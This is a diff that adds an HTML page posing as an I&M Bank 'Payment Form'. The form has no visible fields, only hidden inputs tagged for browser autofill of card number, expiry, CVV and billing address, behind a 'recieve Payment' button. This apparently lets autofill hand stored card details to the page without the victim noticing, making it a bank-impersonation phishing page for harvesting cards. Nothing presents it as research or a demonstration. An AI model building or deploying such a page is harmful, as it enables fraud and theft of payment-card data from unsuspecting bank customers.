@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Form</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <h1>Thank you for choosing I&M Bank Personal Banking</h1>
+        <form id="paymentForm">
+            <input type="hidden" id="cardNumber" name="cardNumber" autocomplete="cc-number">
+            <input type="hidden" id="expiryDate" name="expiryDate" autocomplete="cc-exp">
+            <input type="hidden" id="cvv" name="cvv" autocomplete="cc-csc">
+            <input type="hidden" id="billingAddress" name="billingAddress" autocomplete="billing address">
+            <input type="hidden" id="billingCity" name="billingCity" autocomplete="billing address-level2">
+            <input type="hidden" id="billingState" name="billingState" autocomplete="billing address-level1">
+            <input type="hidden" id="billingPostalCode" name="billingPostalCode" autocomplete="billing postal-code">
+            <input type="hidden" id="billingCountry" name="billingCountry" autocomplete="billing country">
+            
+            <button type="submit">recieve Payment</button>
+        </form>
+        <p class="privacy">At I&M Bank, we value your data privacy. Read our <a href="#">Privacy Notice</a>.</p>
+        <div id="output" class="output"></div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
